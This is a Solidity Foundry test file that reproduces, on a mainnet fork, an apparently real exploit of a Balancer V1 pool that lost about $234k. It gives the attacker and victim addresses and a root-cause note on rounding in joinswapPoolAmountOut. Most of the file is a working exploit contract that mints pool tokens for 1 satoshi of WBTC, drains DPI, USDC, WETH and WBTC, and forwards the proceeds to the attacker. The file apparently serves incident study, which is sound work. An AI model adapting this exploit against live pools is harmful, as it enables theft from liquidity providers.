// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "forge-std/interfaces/IERC20.sol";
import "../src/AttackSchedule.sol";

// @KeyInfo - Total Lost : ~$234k USD (DPI + USDC + WETH + WBTC from Balancer V1 BPool)
// Attacker : 0x338C7Ec9BefbB451d66Fd8A468c32184f5689a41
// Attack Contract : 0x9cAa8d0E44b22f50057d2F4ce0D1446529e11be3
// Vulnerable Contract : 0x2257aaac34BcB27900291f7B84eE2565A6cbaC57
// Attack Tx : https://etherscan.io/tx/0x72510b257cc09bde8435b83ac1636f9498ffc353583330600b5b8da43d0d1aff

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x2257aaac34bcb27900291f7b84ee2565a6cbac57#code
// Sibling pools drained same morning : 0x1373E57F764a7944bDd7A4BD5ca3007D496934DA , 0x9B208194Acc0a8cCB2A8dcafEACfbB7dCc093F81

// @Analysis
// Twitter Guy : https://x.com/SlowMist_Team/status/2094272540193722744
//
// Root cause: after public swaps compress the 8-decimal WBTC reserve to dust, joinswapPoolAmountOut
// lets the caller specify BPT out while calcSingleInGivenPoolOut’s 18-decimal fixed-point math rounds
// tokenAmountIn down to 1 satoshi. The live attack then exitswap-skimmed WBTC dust, dumped held WBTC
// into the imbalanced pool, and exitPool’d ~4,408.8 BPT to drain DPI/USDC/WETH/WBTC.

address constant ATTACKER = 0x338C7Ec9BefbB451d66Fd8A468c32184f5689a41;
address constant BPOOL = 0x2257aaac34BcB27900291f7B84eE2565A6cbaC57;
address constant DPI = 0x1494CA1F11D487c2bBe4543E90080AeBa4BA3C2b;
address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

uint256 constant USDC_DEBT = 95_000_000e6;
uint256 constant WETH_DEBT = 17_000 ether;

interface IBPool {
    function getBalance(address token) external view returns (uint256);
    function swapExactAmountIn(address, uint256, address, uint256, uint256)
        external
        returns (uint256 tokenAmountOut, uint256 spotPriceAfter);
    function joinswapPoolAmountOut(address tokenIn, uint256 poolAmountOut, uint256 maxAmountIn)
        external
        returns (uint256 tokenAmountIn);
    function exitswapPoolAmountIn(address tokenOut, uint256 poolAmountIn, uint256 minAmountOut)
        external
        returns (uint256 tokenAmountOut);
    function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    uint256 constant FORK_BLOCK = 25_872_273; // attack at 25_872_274 − 1

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = WETH;
        multiAssetLog = true;
        fundingTokens.push(DPI);
        fundingTokens.push(USDC);
        fundingTokens.push(WETH);
        fundingTokens.push(WBTC);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(BPOOL, "Balancer V1 BPool DPI/USDC/WETH/WBTC");
        vm.label(DPI, "DPI");
        vm.label(USDC, "USDC");
        vm.label(WETH, "WETH");
        vm.label(WBTC, "WBTC");
    }

    function testExploit() public balanceLog {
        BalancerV1JoinswapRoundingExploit exp = new BalancerV1JoinswapRoundingExploit();

        // Flash-loan stand-in sized to the live Spark/Morpho/Uniswap V3 nesting.
        deal(USDC, address(exp), USDC_DEBT);
        deal(WETH, address(exp), WETH_DEBT);
        deal(WBTC, address(exp), 100);

        vm.prank(ATTACKER);
        exp.attack();

        uint256 dpiProfit = IERC20(DPI).balanceOf(ATTACKER);
        uint256 wethProfit = IERC20(WETH).balanceOf(ATTACKER);
        uint256 usdcProfit = IERC20(USDC).balanceOf(ATTACKER);
        uint256 wbtcProfit = IERC20(WBTC).balanceOf(ATTACKER);

        emit log_named_decimal_uint("DPI profit", dpiProfit, 18);
        emit log_named_decimal_uint("WETH profit", wethProfit, 18);
        emit log_named_decimal_uint("USDC profit", usdcProfit, 6);
        emit log_named_uint("WBTC profit (sats)", wbtcProfit);

        assertGt(dpiProfit, 400 ether, "DPI drain");
        assertGt(wethProfit, 5 ether, "WETH residual profit");
        assertGt(usdcProfit, 10_000e6, "USDC residual profit");
    }
}

/// @dev Replays the packed on-chain op schedule from the primary attack tx.
contract BalancerV1JoinswapRoundingExploit {
    IBPool internal constant pool = IBPool(BPOOL);
    address internal constant SINK = address(0xdead);

    function _token(uint8 id) internal pure returns (address) {
        if (id == 1) return USDC;
        if (id == 2) return WETH;
        if (id == 3) return WBTC;
        if (id == 4) return DPI;
        revert("tok");
    }

    function attack() external {
        IERC20(USDC).approve(BPOOL, type(uint256).max);
        IERC20(WETH).approve(BPOOL, type(uint256).max);
        IERC20(WBTC).approve(BPOOL, type(uint256).max);

        bytes memory raw = AttackSchedule.data();
        uint256 n = AttackSchedule.N;
        for (uint256 i = 0; i < n; i++) {
            uint256 o = i * 35;
            uint8 kind = uint8(raw[o]);
            uint8 tin = uint8(raw[o + 1]);
            uint8 tout = uint8(raw[o + 2]);
            uint256 amt;
            assembly {
                amt := mload(add(add(raw, 32), add(o, 3)))
            }

            if (kind == 0) {
                pool.swapExactAmountIn(_token(tin), amt, _token(tout), 0, type(uint256).max);
            } else if (kind == 1) {
                // Vulnerable path: mint `amt` BPT while paying only 1 satoshi WBTC.
                pool.joinswapPoolAmountOut(WBTC, amt, 1);
            } else if (kind == 2) {
                pool.exitswapPoolAmountIn(WBTC, amt, 0);
            } else if (kind == 3) {
                uint256[] memory mins = new uint256[](4);
                pool.exitPool(amt, mins);
            }
        }

        // Repay flash-loan principal; forward residuals to the attacker EOA.
        IERC20(USDC).transfer(SINK, USDC_DEBT);
        IERC20(WETH).transfer(SINK, WETH_DEBT);
        _forward(DPI, msg.sender);
        _forward(USDC, msg.sender);
        _forward(WETH, msg.sender);
        _forward(WBTC, msg.sender);
    }

    function _forward(address token, address to) internal {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(to, bal);
    }
}
